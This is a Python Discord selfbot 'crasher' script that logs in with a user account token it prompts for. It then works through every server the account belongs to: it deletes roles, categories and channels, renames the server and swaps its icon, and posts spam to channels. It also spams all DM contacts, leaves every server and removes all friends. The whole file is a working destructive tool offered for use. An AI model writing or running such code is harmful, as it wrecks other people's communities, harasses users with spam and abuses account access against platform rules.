# libs
import os
import sys
from discord.ext import commands

if not os.path.exists('config.txt'):
    srvsname = str(input("Whats crashed servers name you want?\n "))
    chspam = str(input("Whats spam-message for channels you want?\n "))
    pchspam = str(input("Whats spam-message for private channels (DMs) you want?\n "))
    saveconfig = str(input("Do you want save config into config.txt? (y/n)\n "))
    if saveconfig == "y":
        conf = open('config.txt','w',encoding='UTF-8')
        conf.write(f"{srvsname}\n{chspam}\n{pchspam}")
    elif saveconfig == "n":
        pass
    else:
        sys.exit('Invalid argument!')
else:
    conf = open('config.txt','r')
    conf = conf.read().split('\n')
    srvsname = conf[0]
    chspam = conf[1]
    pchspam = conf[2]

# vars
client = commands.Bot(command_prefix="%selbotcrasher_prefix%", self_bot=True)

# commands
@client.event
async def on_ready():
    for g in client.guilds:
        if g.me.guild_permissions.manage_roles:
            for r in g.roles:
                print(f"Trying to delete role {r} in guild {g}")
                try:
                    await r.delete()
                except:
                    pass
        print(f"Trying to change avatar in guild {g}")
        try:
            with open('avatar.png','rb') as f:
                try:
                    await g.edit(name=srvsname, icon=f.read())
                except:
                    pass
        except:
            pass
        if g.me.guild_permissions.manage_channels:
            try:
                for ct in g.categories:
                    print(f"Trying to delete category {ct} in guild {g}")
                    try:
                        await ct.delete()
                    except:
                        pass
            except:
                pass
            try:
                for c in g.text_channels:
                    try:
                        print(f"Trying to delete text channel {c} in guild {g}")
                        await c.send(chspam)
                    except:
                        pass
                    try:
                        await c.delete() 
                    except:
                        pass
            except:
                pass
            try:
                for vc in g.voice_channels:
                    try:
                        print(f"Trying to delete voice channel {vc} in guild {g}")
                        await vc.delete()
                    except:
                        pass
            except:
                pass
    for dm in client.private_channels:
        try:
            print(f"Trying to send DM to {dm}")
            await dm.send(pchspam)
        except:
            pass
    for gld in client.guilds:
        try:
            print(f"Trying to leave guild {g}")
            await gld.leave()
        except:
            pass
    for frnd in client.user.friends:
        print(f"Trying to remove friend {frnd}")
        await frnd.remove_friend()

# run
token = str(input("Token: "))
client.run(token, bot=False)
